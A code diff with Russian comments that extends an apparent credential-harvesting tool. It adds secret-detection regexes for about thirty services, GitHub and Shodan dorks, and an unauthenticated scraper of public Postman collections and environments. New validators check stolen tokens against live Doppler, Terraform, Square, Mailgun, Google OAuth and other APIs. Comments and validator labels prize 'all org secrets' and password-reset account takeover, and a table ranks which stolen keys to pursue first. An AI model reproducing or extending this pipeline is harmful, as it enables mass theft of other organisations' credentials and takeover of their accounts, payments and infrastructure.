@@ -645,6 +645,69 @@ KEY_PATTERNS = [
         ],
         False,
     ),
+    # ==== OSINT-ВОЛНА 2026-09-10 (Claude-OSINT §17 каталог, 80 паттернов) ====
+    # секретс-менеджеры = ВСЕ секреты орга разом:
+    ("doppler", r"dp\.pt\.[A-Za-z0-9]{40,44}", [], False),  # Doppler token
+    # open-ended: кап {90,100} резал длинные токены (boundary-check на срезе)
+    ("vault", r"hvs\.[A-Za-z0-9_\-]{90,}", [], False),  # HashiCorp Vault
+    ("terraform", r"[A-Za-z0-9]{14}\.atlasv1\.[A-Za-z0-9_\-=]{60,70}", [], False),
+    # облака/инфра:
+    ("digitalocean", r"dop_v1_[a-f0-9]{64}", [], False),
+    ("dockerhub", r"dckr_pat_[A-Za-z0-9_\-]{27,}", [], False),
+    ("jfrog", r"AKCp[A-Za-z0-9]{50,70}", [], False),
+    ("ngrok", r"\b[12][A-Za-z0-9]{26}_[A-Za-z0-9]{32,}\b", [], False),
+    # платёжка/коммерция:
+    ("square", r"sq0atp-[0-9A-Za-z\-_]{22}", [], False),
+    ("square-secret", r"sq0csp-[0-9A-Za-z\-_]{43}", [], False),
+    # dev-инструменты с чужими ключами внутри:
+    ("postman", r"PMAK-[A-Za-z0-9]{24,64}", [], False),  # Postman = коллекции
+    ("databricks", r"dapi[0-9a-f]{32}(?:-\d)?", [], False),
+    ("dropbox", r"sl\.[A-Za-z0-9_\-]{100,}", [], False),  # open-ended: {130,140} резал
+    ("mailchimp", r"[0-9a-f]{32}-us[0-9]{1,2}", [], False),  # dc-суффикс в ключе
+    ("rubygems", r"rubygems_[a-f0-9]{48}", [], False),
+    ("grafana-cloud", r"glc_[A-Za-z0-9+/]{32,}={0,2}", [], False),
+    ("atlassian", r"ATATT3xFfGF0[A-Za-z0-9_\-]{180,}", [], False),
+    ("newrelic", r"(?:NRAA|NRAK|NRBR)-[A-F0-9]{27}", [], False),
+    ("pypi", r"pypi-AgENdGV[A-Za-z0-9_\-]+", [], False),
+    ("fcm", r"AAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140,}", [], False),
+    (
+        "slack-webhook",
+        # (?:...) — НЕзахватывающие: экстрактор берёт group(1) при наличии
+        # групп — захватывающие T/B ломали бы извлечение полного URL
+        r"https://hooks\.slack\.com/services/(?:T[A-Z0-9]+)/(?:B[A-Z0-9]+)/[A-Za-z0-9]+",
+        [],
+        False,
+    ),
+    # контекст-анкоред (FP-защита — матч только рядом с именем сервиса):
+    ("okta", r"(?i)SSWS\s+([0-9a-zA-Z_\-]{38,})", [], False),
+    (
+        "heroku",
+        r"(?i)heroku[^\n]{0,60}?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})",
+        [],
+        False,
+    ),
+    (
+        "datadog",
+        r"(?i)(?:datadog|dd[_\-]?api[_\-]?key)[^\n]{0,60}?([a-f0-9]{32})",
+        [],
+        False,
+    ),
+    ("mailgun", r"(?i)mailgun[^\n]{0,60}?\bkey-([0-9a-zA-Z]{32})\b", [], False),
+    (
+        "algolia",
+        r"(?i)algolia[^\n]{0,60}?admin[^\n]{0,40}?\b([A-Za-z0-9]{32})\b",
+        [],
+        False,
+    ),
+    (
+        "azure-ad",
+        r"(?i)(?:azure|entra)[_\-]?(?:client|app)[_\-]?secret['\"\s:=]+([A-Za-z0-9_~.\-]{34,40})",
+        [],
+        False,
+    ),
+    # oauth-токены (короткоживущие, но мгновенный доступ):
+    ("facebook", r"EAA[A-Za-z0-9]{90,}", [], False),
+    ("google-oauth-token", r"ya29\.[0-9A-Za-z_\-]{20,}", [], False),
     ("groq", r"gsk_[A-Za-z0-9]{30,}", ["https://api.groq.com/openai/v1"], False),
     (
         "huggingface",
@@ -1443,13 +1506,19 @@ def extract_candidates(text):
             if m.groups() and m.group(1):
                 key = m.group(1)
                 mstart, mend = m.start(1), m.end(1)
+                mfull = m.start()  # старт ПОЛНОГО матча (для левой границы)
             else:
                 key = m.group(0)
                 mstart, mend = m.start(), m.end()
+                mfull = mstart
             # АНТИ-ПРЕФИКС: матч — кусок более длинного токена? (sk20/skgen режут oat01!)
             if mend < len(text) and text[mend] in KEYCH:
                 continue
-            if mstart > 0 and text[mstart - 1] in "_-":
+            # АУДИТ-фикс: левую границу меряем по ПОЛНОМУ матчу, не по группе:
+            # capture-паттерны (mailgun "key-([hex])", okta "SSWS (токен)")
+            # имеют префикс ФОРМАТА прямо перед группой — проверка по группе
+            # ложно убивала их ("key-" = часть формата, не кусок длинного токена)
+            if mfull > 0 and text[mfull - 1] in "_-":
                 continue
             # АУДИТ-фикс: startswith по блэклисту убивал РЕАЛЬНЫЕ ключи вида
             # sk-1234abcd... (случайное совпадение 1/62^4, при миллионах
@@ -1993,6 +2062,27 @@ class GitHubCode(Source):
             '"kimi-k3" "api_key"',
             '"glm-5" "api_key" path:.env',
             '"glm-5.3" "apiKey"',
+            # 🧰 OSINT-ВОЛНА (Claude-OSINT §17): секретс-менеджеры/облака/платёжки
+            '"dp.pt."',  # Doppler — все секреты орга
+            '"hvs." extension:env',  # Vault tokens
+            '"atlasv1"',  # Terraform Cloud
+            '"dop_v1_"',  # DigitalOcean
+            '"PMAK-"',  # Postman (коллекции с чужими ключами)
+            '"sq0atp-"',  # Square
+            '"dckr_pat_"',  # Docker Hub
+            '"rubygems_"',
+            '"AKCp"',  # JFrog
+            '"dapi" "databricks"',
+            "hooks.slack.com/services",
+            '"ATATT3xFfGF0"',
+            '"SSWS " extension:env',  # Okta admin
+            '"ya29." extension:txt',  # google oauth access tokens
+            '"-us" "mailchimp" extension:env',
+            '"dp.pt." extension:env',
+            '"EAA" "EAAB" extension:txt',  # facebook tokens
+            '"xapp-1-" extension:env',  # slack app-level
+            '"glc_" extension:env',  # grafana cloud
+            '"dop_v1_" extension:env',
         ]
         # 🧠 САМОУЛУЧШЕНИЕ: hot/cold статистика запросов.
         # hot (стабильно дают выдачу) — каждый цикл; cold (3 нуля подряд) —
@@ -3470,6 +3560,25 @@ class Shodan(Source):
         ('http.html:"GROQ_API_KEY" "gsk_"', 1),
         ('http.html:"DEEPSEEK_API_KEY" "sk-"', 2),
         ('http.html:"MOONSHOT"', 1),
+        # ============ 🧰 OSINT-ВОЛНА (секретс-менеджеры/облака/платёжки) ============
+        ('http.html:"dp.pt."', 2),  # Doppler — ВСЕ секреты орга
+        ('http.html:"hvs."', 1),  # HashiCorp Vault токены
+        ('http.html:"atlasv1"', 2),  # Terraform Cloud (state = секреты инфры)
+        ('http.html:"dop_v1_"', 2),  # DigitalOcean
+        ('http.html:"PMAK-"', 2),  # Postman = коллекции с чужими ключами
+        ('http.html:"sq0atp-"', 1),  # Square платежи
+        ('http.html:"dckr_pat_"', 1),  # Docker Hub (приватные образы с ENV)
+        ('http.html:"dapi" "databricks"', 1),
+        ('http.html:"hooks.slack.com/services"', 1),
+        ('http.html:"ATATT3xFfGF0"', 1),  # Atlassian
+        ('http.html:"rubygems_"', 1),
+        ('http.html:"AKCp"', 1),  # JFrog
+        ('http.html:"-us" "mailchimp"', 1),
+        ('http.html:"SSWS "', 1),  # Okta admin
+        ('http.html:"ya29."', 1),  # Google OAuth access tokens
+        ('http.html:"EAA" "facebook"', 1),
+        ('http.html:"xapp-1-"', 1),  # slack app-level
+        ('http.html:"NRAA-" OR "NRAK-"', 1),  # New Relic
     ]
 
     def _key_pool(self):
@@ -8615,6 +8724,208 @@ class TGGlobalHunt(Source):
         return out
 
 
+class PostmanHunt(Source):
+    """📮 POSTMAN PUBLIC NETWORK (Claude-OSINT §24) — НЕаутентифицированный
+    поиск по ВСЕМ публичным workspace/collection/environment Postman.
+    Разрабы хранят прод-ключи в collection variables и environments —
+    легендарная жила (postman-leaks). Прокси: POST /_api/ws/proxy
+    {service:search, path:/search-all}. Дальше — детальный обход ID'шек:
+    /_api/workspace/{id} (collections+environments), /_api/collection/{id}
+    (полные запросы: auth-заголовки, скрипты), /_api/environment/{id}
+    (значения переменных = КЛЮЧИ)."""
+
+    name = "postman"
+
+    QUERIES = (
+        "sk-ant-",
+        "sk-proj-",
+        "OPENAI_API_KEY",
+        "ANTHROPIC_API_KEY",
+        "claude api key",
+        "openai api key",
+        "moonshot",
+        "bigmodel",
+        "glm api key",
+        "deepseek api key",
+        "openrouter",
+        "AWS_SECRET_ACCESS_KEY",
+        "supabase service_role",
+        "stripe sk_live",
+        "mongodb+srv",
+        "postgres://",
+        "OPENAI_API_BASE",
+        "bearer token api",
+        "api_key secret",
+        "doppler",
+    )
+    PER_CYCLE = 4
+    _PROXY = "https://www.postman.com/_api/ws/proxy"
+    _STATE = os.path.join(HERE, "postman_state.json")
+
+    def fetch(self):
+        out = []
+        try:
+            st = json.load(open(self._STATE, encoding="utf-8"))
+        except Exception:
+            st = {}
+        seen_ids = set(st.get("seen") or [])
+        rot = int(time.time() // 900)
+        qs = [
+            self.QUERIES[(rot + i) % len(self.QUERIES)] for i in range(self.PER_CYCLE)
+        ]
+        sess = requests.Session()
+        sess.trust_env = False
+        sess.headers.update(
+            {"Content-Type": "application/json", "X-Entity-Team-Id": "0"}
+        )
+        ws_ids, coll_ids, env_ids = [], [], []
+
+        def _collect_ids(obj):
+            """Рекурсивный сбор id по типовым полям постмана."""
+            if isinstance(obj, dict):
+                for k, v in obj.items():
+                    lk = k.lower()
+                    if lk == "id" and isinstance(v, str) and len(v) > 8:
+                        # id без типа — определим по соседям позже; собираем
+                        # только если рядом типизированный контекст
+                        pass
+                    if lk in ("workspaceid", "workspace_id") and isinstance(v, str):
+                        ws_ids.append(v)
+                    elif lk in (
+                        "collectionid",
+                        "collection_id",
+                        "collectionuid",
+                    ) and isinstance(v, str):
+                        coll_ids.append(v)
+                    elif lk in (
+                        "environmentid",
+                        "environment_id",
+                        "environmentuid",
+                    ) and isinstance(v, str):
+                        env_ids.append(v)
+                    elif isinstance(v, (dict, list)):
+                        _collect_ids(v)
+                    # сырое тело хитов — сразу в пайплайн (там бывают сниппеты)
+                # текстовые поля хита: name/description/summary — тащим как чанк
+                try:
+                    blob = json.dumps(obj, ensure_ascii=False)
+                    if any(
+                        m in blob
+                        for m in (
+                            "sk-",
+                            "AKIA",
+                            "api_key",
+                            "API_KEY",
+                            "Bearer ",
+                            "secret",
+                            "token",
+                            "AIza",
+                        )
+                    ):
+                        out.append((blob[:30000], "postman:search"))
+                except Exception:
+                    pass
+            elif isinstance(obj, list):
+                for x in obj:
+                    _collect_ids(x)
+
+        for q in qs:
+            try:
+                r = sess.post(
+                    self._PROXY,
+                    json={
+                        "service": "search",
+                        "method": "POST",
+                        "path": "/search-all",
+                        "body": {
+                            "queryIndices": [
+                                "collaboration.workspace",
+                                "runtime.collection",
+                                "runtime.request",
+                            ],
+                            "queryText": q,
+                            "size": 100,
+                            "from": 0,
+                            "clientTraceId": "",
+                            "queryAllIndices": False,
+                            "domain": "public",
+                        },
+                    },
+                    timeout=(12, 25),
+                    verify=False,
+                )
+                if r.status_code != 200:
+                    continue
+                data = r.json().get("data") or []
+                log("  [postman] %r: %d хитов" % (q, len(data)))
+                for item in data:
+                    _collect_ids(item)
+            except Exception:
+                continue
+            time.sleep(1.2)
+
+        # детальный обход: workspace -> коллекции/энвы; коллекции/энвы напрямую
+        def _fetch_json(path):
+            try:
+                r = sess.get(
+                    "https://www.postman.com/_api/" + path,
+                    timeout=(10, 20),
+                    verify=False,
+                )
+                if r.status_code == 200:
+                    return r.json()
+            except Exception:
+                pass
+            return None
+
+        detail_budget = 30
+        for wid in list(dict.fromkeys(ws_ids))[:10]:
+            if detail_budget <= 0:
+                break
+            if wid in seen_ids:
+                continue
+            seen_ids.add(wid)
+            wj = _fetch_json("workspace/%s" % wid)
+            detail_budget -= 1
+            if not wj:
+                continue
+            # коллекции и энвы воркспейса
+            for coll_path in ("collection", "environment"):
+                lst = _fetch_json("workspace/%s/%s" % (wid, coll_path))
+                detail_budget -= 1
+                if isinstance(lst, list):
+                    for it in lst[:6]:
+                        cid = it.get("id") if isinstance(it, dict) else None
+                        if not cid or cid in seen_ids:
+                            continue
+                        seen_ids.add(cid)
+                        (coll_ids if coll_path == "collection" else env_ids).append(cid)
+                if detail_budget <= 0:
+                    break
+
+        for cid in list(dict.fromkeys(coll_ids))[: max(0, min(12, detail_budget))]:
+            cj = _fetch_json("collection/%s" % cid)
+            detail_budget -= 1
+            if cj:
+                out.append(
+                    (json.dumps(cj, ensure_ascii=False)[:120000], "postman:collection")
+                )
+        for eid in list(dict.fromkeys(env_ids))[: max(0, min(8, detail_budget))]:
+            ej = _fetch_json("environment/%s" % eid)
+            detail_budget -= 1
+            if ej:
+                out.append(
+                    (json.dumps(ej, ensure_ascii=False)[:60000], "postman:environment")
+                )
+
+        try:
+            st["seen"] = list(seen_ids)[-4000:]
+            _atomic_json_dump(self._STATE, st)
+        except Exception:
+            pass
+        return out
+
+
 ALL_SOURCE_CLASSES = [
     Gists,
     Lobsters,
@@ -8689,6 +9000,8 @@ ALL_SOURCE_CLASSES = [
     # АУДИТ-фикс 2026-09-10: класс был полностью написан (фингерпринтинг +
     # автопроверка бордов), но НИГДЕ не инстанцировался — источник не работал
     RelayBoards,
+    # 📮 Postman public network: публичные коллекции/энвы с прод-ключами
+    PostmanHunt,
 ]
 
 
@@ -9788,6 +10101,20 @@ def validate_aws(key, origin=None):
             return None
         arn_m = re.search(r"<Arn>([^<]+)</Arn>", r.text)
         acc_m = re.search(r"<Account>([^<]+)</Account>", r.text)
+        # ОФЛАЙН-ДЕКОД (fwd:cloudsec рецепт): account id зашит в сам AKIA
+        # (chars 5-14 = base32, >>7 & 40bit). Фолбэк если XML-парс промахнулся
+        # (был кейс "account: ?" при живом ключе). Проверено на живом: OK.
+        if not acc_m:
+            try:
+                import base64 as _b64
+
+                _z = int.from_bytes(_b64.b32decode(ak[4:14] + "======"), "big")
+                _acc = str((_z >> 7) & 0xFFFFFFFFFF).zfill(12)
+            except Exception:
+                _acc = ""
+            acc_str = _acc or "?"
+        else:
+            acc_str = acc_m.group(1)
         return {
             "key": "%s:%s" % (ak, sk),
             "base": "https://sts.amazonaws.com",
@@ -9800,7 +10127,7 @@ def validate_aws(key, origin=None):
             "stars_working": [],
             "balance": None,
             "tier": "AWS LIVE (account: %s | %s)"
-            % (acc_m.group(1) if acc_m else "?", arn_m.group(1)[:70] if arn_m else "?"),
+            % (acc_str, arn_m.group(1)[:70] if arn_m else "?"),
             "usage": None,
             "embed": None,
             "rerank": None,
@@ -10345,6 +10672,409 @@ def validate_voyage(key):
     except Exception:
         pass
     return None
+
+
+# ---------------- OSINT-ВОЛНА 2026-09-10: валидаторы новых классов ------------
+# Единый стиль: GET identity-эндпоинт с нативной auth-схемой провайдера.
+# 200 = LIVE (working), 401/403 = мёртв, 429 = валиден но лимит (no_balance),
+# сеть/прочее = None (attempts-ретрай в пайплайне).
+
+
+def validate_doppler(key):
+    """Doppler dp.pt. — секретс-менеджер: токен = ВСЕ секреты орга."""
+    try:
+        r = http(
+            "GET",
+            "https://api.doppler.com/v3/me",
+            timeout=(8, 15),
+            headers={"Authorization": "Bearer " + str(key)},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json()
+            wp = ((j.get("workplace") or {}).get("name")) or "?"
+            return _simple_rec(
+                key,
+                "https://api.doppler.com",
+                "doppler",
+                "DOPPLER LIVE (workplace: %s) — ВСЕ секреты орга" % wp,
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_terraform(key):
+    """Terraform Cloud atlasv1: state-файлы содержат ВСЕ секреты инфры."""
+    try:
+        r = http(
+            "GET",
+            "https://app.terraform.io/api/v2/account/details",
+            timeout=(8, 15),
+            headers={"Authorization": "Bearer " + str(key)},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json()
+            un = ((j.get("data") or {}).get("attributes") or {}).get("username") or "?"
+            return _simple_rec(
+                key,
+                "https://app.terraform.io",
+                "terraform",
+                "TERRAFORM CLOUD LIVE (@%s) — state = все секреты инфры" % un,
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_digitalocean(key):
+    """DigitalOcean dop_v1_: дроплеты/снапшоты/spaces аккаунта."""
+    try:
+        r = http(
+            "GET",
+            "https://api.digitalocean.com/v2/account",
+            timeout=(8, 15),
+            headers={"Authorization": "Bearer " + str(key)},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json().get("account") or {}
+            return _simple_rec(
+                key,
+                "https://api.digitalocean.com",
+                "digitalocean",
+                "DO LIVE: %s (droplet limit %s)"
+                % (j.get("email", "?"), j.get("droplet_limit", "?")),
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_square(key):
+    """Square sq0atp-: платёжный акк — локации/платежи/покупатели."""
+    try:
+        r = http(
+            "GET",
+            "https://connect.squareup.com/v2/locations",
+            timeout=(8, 15),
+            headers={
+                "Authorization": "Bearer " + str(key),
+                "Square-Version": "2024-01-18",
+            },
+        )
+        if r is not None and r.status_code == 200:
+            locs = r.json().get("locations") or []
+            names = [str(l.get("name") or "?")[:20] for l in locs[:4]]
+            return _simple_rec(
+                key,
+                "https://connect.squareup.com",
+                "square",
+                "SQUARE LIVE: %d локаций (%s) — платежи/заказы"
+                % (len(locs), ", ".join(names) or "?"),
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_postman(key):
+    """Postman PMAK: /me — токен = доступ к коллекциям (в них чужие ключи)."""
+    try:
+        r = http(
+            "GET",
+            "https://api.getpostman.com/me",
+            timeout=(8, 15),
+            headers={"X-Api-Key": str(key)},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json().get("user") or {}
+            return _simple_rec(
+                key,
+                "https://api.getpostman.com",
+                "postman",
+                "POSTMAN LIVE: @%s — коллекции/энвы (внутри чужие ключи)"
+                % (j.get("username") or j.get("email") or "?"),
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_dropbox(key):
+    """Dropbox sl.: файлы юзера (там .env/бэкапы/дампы)."""
+    try:
+        r = http(
+            "POST",
+            "https://api.dropboxapi.com/2/users/get_current_account",
+            timeout=(8, 15),
+            headers={"Authorization": "Bearer " + str(key)},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json()
+            return _simple_rec(
+                key,
+                "https://api.dropboxapi.com",
+                "dropbox",
+                "DROPBOX LIVE: %s (%s) — файлы"
+                % ((j.get("name") or {}).get("display_name", "?"), j.get("email", "?")),
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_mailchimp(key):
+    """Mailchimp {hex32}-us{N}: dc прямо в ключе — basic auth любой_юзер:ключ."""
+    m = re.search(r"([0-9a-f]{32})-(us[0-9]{1,2})", str(key))
+    if not m:
+        return None
+    tok, dc = m.group(1), m.group(2)
+    try:
+        import base64 as _b
+
+        basic = _b.b64encode(("user:%s" % tok).encode()).decode()
+        r = http(
+            "GET",
+            "https://%s.api.mailchimp.com/3.0/" % dc,
+            timeout=(8, 15),
+            headers={"Authorization": "Basic " + basic},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json()
+            return _simple_rec(
+                key,
+                "https://%s.api.mailchimp.com" % dc,
+                "mailchimp",
+                "MAILCHIMP LIVE: %s (%s подписчиков)"
+                % (j.get("account_name", "?"), (j.get("total_subscribers") or "?")),
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_dockerhub(key):
+    """Docker Hub dckr_pat_: акк = приватные образы (в их ENV — ключи)."""
+    try:
+        r = http(
+            "GET",
+            "https://hub.docker.com/v2/user",
+            timeout=(8, 15),
+            headers={"Authorization": "Bearer " + str(key)},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json()
+            return _simple_rec(
+                key,
+                "https://hub.docker.com",
+                "dockerhub",
+                "DOCKER HUB LIVE: @%s — приватные образы" % (j.get("username") or "?"),
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_rubygems(key):
+    """RubyGems: publish-доступ к гемам аккаунта."""
+    try:
+        r = http(
+            "GET",
+            "https://rubygems.org/api/v1/api_key",
+            timeout=(8, 15),
+            headers={"Authorization": str(key)},
+        )
+        if r is not None and r.status_code == 200:
+            return _simple_rec(
+                key,
+                "https://rubygems.org",
+                "rubygems",
+                "RUBYGEMS LIVE (push-доступ: %s)" % r.text[:60],
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_heroku(key):
+    """Heroku API key (uuid): акк = приложения/аддоны/конфиги (env!)."""
+    try:
+        r = http(
+            "GET",
+            "https://api.heroku.com/account",
+            timeout=(8, 15),
+            headers={
+                "Authorization": "Bearer " + str(key),
+                "Accept": "application/vnd.heroku+json; version=3",
+            },
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json()
+            return _simple_rec(
+                key,
+                "https://api.heroku.com",
+                "heroku",
+                "HEROKU LIVE: %s — приложения и их env-конфиги"
+                % (j.get("email") or "?"),
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_datadog(key):
+    """Datadog API key: /api/v1/validate — логи/метрики (в логах ключи!)."""
+    try:
+        r = http(
+            "GET",
+            "https://api.datadoghq.com/api/v1/validate",
+            timeout=(8, 15),
+            headers={"DD-API-KEY": str(key)},
+        )
+        if r is not None and r.status_code == 200 and r.json().get("valid"):
+            return _simple_rec(
+                key,
+                "https://api.datadoghq.com",
+                "datadog",
+                "DATADOG LIVE — логи/метрики орга (в логах чужие ключи)",
+            )
+        if r is not None and r.status_code == 403:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_mailgun(key):
+    """Mailgun key-...: отправка почты от домена (АТО-перехват ресетов)."""
+    try:
+        import base64 as _b
+
+        basic = _b.b64encode(("api:%s" % str(key)).encode()).decode()
+        r = http(
+            "GET",
+            "https://api.mailgun.net/v3/domains",
+            timeout=(8, 15),
+            headers={"Authorization": "Basic " + basic},
+        )
+        if r is not None and r.status_code == 200:
+            items = r.json().get("items") or []
+            doms = [
+                str(d.get("name") or "?")[:30] for d in items[:4] if isinstance(d, dict)
+            ]
+            return _simple_rec(
+                key,
+                "https://api.mailgun.net",
+                "mailgun",
+                "MAILGUN LIVE: домены %s — почта от их имени (ресеты!)"
+                % (", ".join(doms) or "?"),
+            )
+        if r is not None and r.status_code == 401:
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_facebook(key):
+    """Facebook EAA token: graph /me — маркетинг/страницы/ads."""
+    try:
+        r = http(
+            "GET",
+            "https://graph.facebook.com/me",
+            timeout=(8, 15),
+            params={"access_token": str(key), "fields": "id,name"},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json()
+            if j.get("id"):
+                return _simple_rec(
+                    key,
+                    "https://graph.facebook.com",
+                    "facebook",
+                    "FACEBOOK LIVE: %s (id %s)" % (j.get("name", "?"), j.get("id")),
+                )
+        # 400/401 = мёртв/просрочен
+        if r is not None and r.status_code in (400, 401):
+            return None
+    except Exception:
+        pass
+    return None
+
+
+def validate_google_oauth_token(key):
+    """Google ya29. access token: tokeninfo -> скоупы (gmail/drive = АТО)."""
+    try:
+        r = http(
+            "GET",
+            "https://oauth2.googleapis.com/tokeninfo",
+            timeout=(8, 15),
+            params={"access_token": str(key)},
+        )
+        if r is not None and r.status_code == 200:
+            j = r.json()
+            scope = str(j.get("scope") or "")[:80]
+            return _simple_rec(
+                key,
+                "https://oauth2.googleapis.com",
+                "google-oauth-token",
+                "GOOGLE OAUTH LIVE: scopes %s (expires %ss)"
+                % (scope, j.get("expires_in", "?")),
+            )
+        if r is not None and r.status_code == 400:
+            return None  # invalid_token = мёртв
+    except Exception:
+        pass
+    return None
+
+
+# лиды без удалённой проверки (нужен org-хост из контекста / интрузивно):
+LEAD_ONLY_TIERS = {
+    "vault": "HashiCorp Vault token (hvs.) — секретс-менеджер; нужен адрес вольта из контекста",
+    "databricks": "Databricks PAT (dapi) — нужен workspace-хост из контекста",
+    "jfrog": "JFrog/Artifactory key (AKCp) — нужен хост из контекста",
+    "grafana-cloud": "Grafana Cloud token (glc_) — метрики/логи/алерты стека",
+    "atlassian": "Atlassian token — Jira/Confluence орга (нужен site из контекста)",
+    "newrelic": "New Relic key — телеметрия орга (в ивентах бывают ключи)",
+    "okta": "Okta SSWS token — IDENTITY ADMIN орга (нужен org-домен)",
+    "algolia": "Algolia ADMIN key — индексы/поиск (нужен app_id из контекста)",
+    "azure-ad": "Azure AD client secret — корпоративный тенант (нужен tenant+client_id)",
+    "square-secret": "Square OAuth secret (sq0csp) — подпись вебхуков/платёжный секрет",
+    "slack-webhook": "Slack webhook — пост в канал (не постим: шум); складываем в стор",
+    "ngrok": "ngrok authtoken — туннели/edge аккаунта",
+    "pypi": "PyPI token — publish-доступ к пакетам аккаунта",
+    "fcm": "FCM legacy server key — push от имени приложения",
+}
+
+
+def validate_lead(key, tag, origin, base_hint):
+    """Жирный лид без безопасного удалённого чека — listed_only, в стор."""
+    return _simple_rec(
+        key,
+        base_hint or "",
+        tag,
+        LEAD_ONLY_TIERS.get(tag, "лид (%s)" % tag),
+        status="listed_only",
+    )
 
 
 def validate_cloudflare(key):
@@ -12961,6 +13691,37 @@ def validate(key, base_hint, tag, origin):
         return validate_jina(key)
     if tag == "voyage":
         return validate_voyage(key)
+    # ==== OSINT-ВОЛНА 2026-09-10 ====
+    if tag == "doppler":
+        return validate_doppler(key)
+    if tag == "terraform":
+        return validate_terraform(key)
+    if tag == "digitalocean":
+        return validate_digitalocean(key)
+    if tag == "square":
+        return validate_square(key)
+    if tag == "postman":
+        return validate_postman(key)
+    if tag == "dropbox":
+        return validate_dropbox(key)
+    if tag == "mailchimp":
+        return validate_mailchimp(key)
+    if tag == "dockerhub":
+        return validate_dockerhub(key)
+    if tag == "rubygems":
+        return validate_rubygems(key)
+    if tag == "heroku":
+        return validate_heroku(key)
+    if tag == "datadog":
+        return validate_datadog(key)
+    if tag == "mailgun":
+        return validate_mailgun(key)
+    if tag == "facebook":
+        return validate_facebook(key)
+    if tag == "google-oauth-token":
+        return validate_google_oauth_token(key)
+    if tag in LEAD_ONLY_TIERS:
+        return validate_lead(key, tag, origin, base_hint)
     if tag == "sentry":
         # для полной валидации нужен org slug — жирный лид
         return {
@@ -15417,6 +16178,35 @@ def run_once(extra_paths=(), post=True):
                 "codex": 0,
                 "codex-web": 0,
                 "openai-web": 0,
+                # OSINT-волна: секретс-менеджеры/облака/платёжки — топ-приоритет
+                "doppler": 0,
+                "terraform": 0,
+                "vault": 1,
+                "digitalocean": 1,
+                "square": 1,
+                "postman": 1,
+                "mailchimp": 1,
+                "mailgun": 1,
+                "dropbox": 1,
+                "heroku": 2,
+                "datadog": 2,
+                "dockerhub": 2,
+                "okta": 2,
+                "azure-ad": 2,
+                "facebook": 3,
+                "google-oauth-token": 3,
+                "rubygems": 3,
+                "atlassian": 3,
+                "jfrog": 4,
+                "databricks": 4,
+                "grafana-cloud": 4,
+                "newrelic": 4,
+                "algolia": 4,
+                "slack-webhook": 5,
+                "ngrok": 5,
+                "pypi": 5,
+                "fcm": 5,
+                "square-secret": 5,
                 "kimi-web": 1,
                 "cursor-web": 1,
                 "supabase-auth": 1,
@@ -15857,6 +16647,35 @@ NON_LLM_TAGS = {
     "perplexity",
     "jina",
     "voyage",
+    # OSINT-волна 2026-09-10: все новые классы — не LLM-chat
+    "doppler",
+    "vault",
+    "terraform",
+    "digitalocean",
+    "square",
+    "square-secret",
+    "postman",
+    "databricks",
+    "dropbox",
+    "mailchimp",
+    "dockerhub",
+    "rubygems",
+    "heroku",
+    "datadog",
+    "mailgun",
+    "facebook",
+    "google-oauth-token",
+    "jfrog",
+    "grafana-cloud",
+    "atlassian",
+    "newrelic",
+    "okta",
+    "algolia",
+    "azure-ad",
+    "slack-webhook",
+    "ngrok",
+    "pypi",
+    "fcm",
 }
 # working-ключи перепроверяем только когда протухли (20ч): каждый quick_chat
 # жжёт квоту самой находки, а свежепроверенный ключ не успевает умереть.
